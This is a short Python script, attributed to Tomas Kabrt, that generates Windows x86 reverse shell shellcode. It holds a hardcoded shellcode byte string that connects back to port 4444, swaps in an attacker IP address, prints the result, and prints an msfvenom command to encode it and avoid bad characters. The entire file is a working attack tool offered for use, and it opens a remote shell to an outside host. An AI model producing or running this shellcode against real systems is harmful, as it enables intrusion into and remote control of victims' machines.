"""
This script can be used to generate basic reverse shell shellcode for windows systems. This shellcodde is relatively small around 300 bytes. The script helps you to change the IP address. Use msfvenom to encode it if needed.

Author: Tomas Kabrt
"""

import socket

# replace the IP address with required reverse IP
ip_address_str = '192.168.45.5'

# custom reverse shellcode to port 4444 - if you need to change the port it is following bytes: 0x5c11
generic_shellcode = (b"\x89\xe5\x66\x81\xec\x10\x06\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x5c\xe8\xf5\xff\xff\xff\x83\xc4\x04\x58\x6a\xff\x01\xc4\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xc1\xca\x0d\x01\xc2\xac\x84\xc0\x75\xf6\x3b\x54\x24\xfc\x75\xe4\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x50\x83\x7c\x24\xfc\xff\x75\xb5\x83\xec\x08\xc3\x68\x8e\x4e\x0e\xec\x68\x72\xfe\xb3\x16\x6a\x0c\xff\x55\x04\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32\x2e\x64\x68\x77\x73\x32\x5f\x54\xff\x54\x24\x18\x89\xc3\x68\xec\xf9\xaa\x60\x68\xd9\x09\xf5\xad\x6a\x0c\xff\x55\x04\x31\xc0\x50\x50\x50\x6a\x06\x6a\x01\x6a\x02\xff\x54\x24\x1c\x89\xc3\x31\xff\x31\xc0\x57\x57\x68\xc0\xa8\x82\xa6\x66\xbf\x11\x5c\xc1\xe7\x10\x66\x83\xc7\x02\x57\x89\xe7\x6a\x10\x57\x53\xff\x54\x24\x24\x31\xc9\x89\xe6\xfd\xb1\x23\xf3\xab\xfc\x53\x53\x53\x50\x50\xfe\xc5\x51\xfe\xcd\x83\xec\x28\xb0\x44\x50\x89\xe7\xb8\x9d\x92\x9b\xff\xf7\xd8\x50\x89\xe3\x89\xe0\x05\x70\xfc\xff\xff\x50\x57\x83\xec\x0c\x6a\x01\x51\x51\x53\x51\x8d\x54\x24\x54\xff\x52\x48")

byte_string = socket.inet_aton(ip_address_str)
little_endian = socket.htonl(int.from_bytes(byte_string, byteorder='big')).to_bytes(4, byteorder='little')
hex_str = ''.join([f'\\x{b:02x}' for b in little_endian])

print("New IP adderss for the shellcode: " + hex_str)
new_shellcode = generic_shellcode.replace(b"\xc0\xa8\x82\xa6", little_endian )
hex_str = ''.join([f'\\x{b:02x}' for b in new_shellcode])

print("New shellcode:")
print(hex_str)
print("\nYou can encode it with msfvenom to avoid bad chars:\n")
print('echo "' + hex_str + '" | msfvenom -p - -a x86 --platform windows -b "\\x00\\x0A\\x0D\\x25\\x26\\x2B\\x3D" -f python -v shellcode')
